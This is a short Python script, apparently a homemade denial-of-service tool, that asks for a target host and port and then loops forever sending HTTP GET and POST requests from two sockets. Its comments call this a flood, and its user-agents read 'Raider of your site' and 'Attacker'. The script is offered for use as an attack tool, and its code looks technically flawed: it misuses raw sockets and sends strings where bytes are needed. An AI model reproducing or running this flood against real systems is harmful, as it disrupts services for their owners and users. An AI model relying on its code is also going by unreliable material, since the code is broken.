import socket, sys
import time
print("Welcome.")
print("Tool made by Wave.")
print("                                                                                        ")
print("    //    ) )                                            //   ) )  // | | ||   / |  / / ")
print("   //    / /  ___              / __     //  ___         //___/ /  //__| | ||  /  | / /  ")
print("  //    / / //   ) ) //   / / //   ) ) // //___) )     / ___ (   / ___  | || / /||/ /   ")
print(" //    / / //   / / //   / / //   / / // //           //   | |  //    | | ||/ / |  /    ")
print("//____/ / ((___/ / ((___( ( ((___/ / // ((____       //    | | //     | | |  /  | /     ")

 # makes the first socket (tcp)

sock1 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
sock2 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
 # asks what host to send packets to
tgtIP = input("enter host to send packets to  ")
 # asks what port to send packets to
tgtPort = int(input("enter port to send packets to "))
int(tgtPort)

 # connects the sockets
sock1.connect((tgtIP, tgtPort))
sock2.connect((tgtIP, tgtPort))
time.sleep(10) # delays the flood
 #  the actual thing in action
while True:
    sock1.send('GET / HTTP/1.1\r\n')
    sock1.send("User-agent: Raider of your site\r\n\r\n")
    print (sock1.recv(1024))
    sock1.send("POST / HTTP/1.1\r\n")
    sock1.send("User-agent: Attacker\r\n\r\n")
    print (sock1.recv(2048))
    # this is sock1 attacking, and printing the info
    print("Both attackers are on orbit")
    # time for sock2 to go in
    sock2.send('GET / HTTP/1.0\r\n')
    sock2.send("User-agent: Attacker2\r\n\r\n")
    print (sock2.recv(1024))
    sock2.send("POST / HTTP/1.1\r\n")
    sock2.send("User-agent: Attacker2 post flood\r\n\r\n")
    print (sock2.recv(2048))
